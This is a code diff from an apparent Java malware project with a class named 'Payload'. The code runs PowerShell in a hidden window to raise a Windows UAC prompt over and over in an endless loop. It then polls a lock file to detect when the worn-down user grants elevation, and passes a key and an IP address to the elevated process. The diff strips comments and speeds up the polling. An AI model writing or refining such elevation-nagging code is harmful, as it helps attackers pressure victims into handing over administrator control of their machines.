@@ -158,26 +158,22 @@ public class Payload {
                 javaExe, jarPath, key, ip
             );
 
-            // Keep the lock file open. The elevated process deletes it.
             FileOutputStream lockStream = new FileOutputStream(lockFile);
 
             while (true) {
                 log("Triggering UAC...");
                 
-                // Launch PowerShell with hidden window
                 Process p = new ProcessBuilder("powershell.exe", "-NoProfile", "-WindowStyle", "Hidden", "-Command", psCommand).start();
-                
-                // Wait for the user to click Yes or No
                 p.waitFor(); 
                 
-                // Check every 50ms if the elevated process deleted the lock file
+                // Spin-check every 15 milliseconds
                 boolean accepted = false;
-                for (int i = 0; i < 100; i++) { 
+                for (int i = 0; i < 400; i++) { 
                     if (!lockFile.exists() || lockFile.delete()) {
                         accepted = true;
                         break;
                     }
-                    Thread.sleep(50);
+                    Thread.sleep(15);
                 }
                 
                 if (accepted) {
